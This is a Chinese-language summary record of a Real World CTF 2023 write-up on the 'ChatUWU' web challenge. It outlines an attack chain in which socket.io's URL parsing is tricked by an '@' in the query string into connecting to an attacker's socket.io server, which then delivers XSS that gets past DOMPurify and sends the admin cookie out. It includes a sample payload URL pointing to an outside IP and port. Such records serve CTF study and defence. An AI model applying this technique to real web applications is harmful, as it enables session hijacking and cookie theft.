---
title: [原创] Realworld CTF 2023 ChatUWU 详解
contest: Real World CTF 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [socket_io_parseuri, location_search_injection, evil_socket_server, cors_origin_star, dompurify_sanitize_bypass, @_at_suffix_url_spoof, xssbot_admin_cookie_steal, realworld_chat, xss_injection]
attack_chain: 前端 io(`/${location.search}`) socket 客户端 → 后端 socket.handshake.query 解析 → DOMPurify 0.24.0 强过滤 → 自建 evil socket.io 服务器 (cors origin *) → payload: /?room=DOMPurify&nickname=guest5279@attacker.host:port → parseuri 正则解析 @ 后 host 为攻击者服务器 → 攻击者发送 isHtml=true + XSS text → admin cookie 外带
key_payload: socket = io(`/${location.search}`) / payload: /?room=DOMPurify&nickname=guest5279@85.244.211.240:9000 / io({cors:{origin:'*'}}) / DOMPurify 0.24.0
one_liner: Realworld CTF 2023 ChatUWU：socket.io parseuri 正则对 location.search 中 @ 符号处理错误导致 socket 客户端连接攻击者服务器，绕过 DOMPurify 强过滤触发 XSS 窃取 admin cookie。
lesson: socket.io parseuri 正则 (galkn/parseuri) 对 authority 部分 user:pass@host 的处理在 location.search 中可被 @ 截断重定向 host；DOMPurify 0.24 配合 isHtml 标记即可绕过 EJS textContent 模式。
quality: high
---
